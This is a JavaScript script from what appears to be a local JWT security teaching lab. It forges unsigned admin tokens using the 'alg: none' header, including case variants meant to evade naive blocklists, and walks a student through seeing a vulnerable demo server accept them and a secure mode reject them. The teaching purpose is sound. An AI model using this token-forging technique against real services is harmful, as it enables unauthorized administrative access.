'use strict';

/**
 * ATTACK 1 — the "alg: none" bypass (local lab tool).
 *
 * The JWT spec defines an algorithm literally called "none", meaning "this
 * token is unsigned". A verifier that honours it will accept ANY claims with
 * no signature at all. This script forges an admin token that carries an empty
 * signature and an `"alg":"none"` header, then prints it so you can paste it
 * into the Token Inspector (or set it as your cookie) and watch the vulnerable
 * server accept it.
 *
 * It targets only the demo app the student also runs. It contacts no network
 * service; it just builds a string.
 */
const jwt = require('../src/jwt');

// The claims an attacker wants the server to believe. Note there is NO secret
// anywhere in this file — that is the whole point of the "none" bypass.
const forgedPayload = {
  sub: 'attacker',
  role: 'admin',
  iss: 'drukpass.local',
  aud: 'drukpass.webapp',
  iat: Math.floor(Date.now() / 1000),
};

// Try a few spellings. Naive verifiers often lowercase-compare only "none",
// so "None" / "nONE" can slip past an incomplete blocklist.
const variants = ['none', 'None', 'nONE'];

console.log('=== Attack 1: alg:none signature bypass ===\n');
console.log('Forged claims (no secret used):');
console.log(JSON.stringify(forgedPayload, null, 2), '\n');

for (const alg of variants) {
  const header = jwt.base64urlEncode(JSON.stringify({ alg, typ: 'JWT' }));
  const payload = jwt.base64urlEncode(JSON.stringify(forgedPayload));
  // "none" means no signature: the third segment is empty, but the trailing
  // dot is kept so the token still has three parts.
  const token = `${header}.${payload}.`;
  console.log(`alg="${alg}":`);
  console.log(token, '\n');
}

console.log('How to use it:');
console.log('  1. Start the VULNERABLE server:  npm run start:vulnerable');
console.log('  2. Open http://localhost:4000/inspect and paste a token above.');
console.log('  3. The vulnerable verifier reports ACCEPTED with role=admin.');
console.log('  4. Restart in SECURE mode (npm run start:secure) and paste it again');
console.log('     — it is now REJECTED before any signature is even considered.');
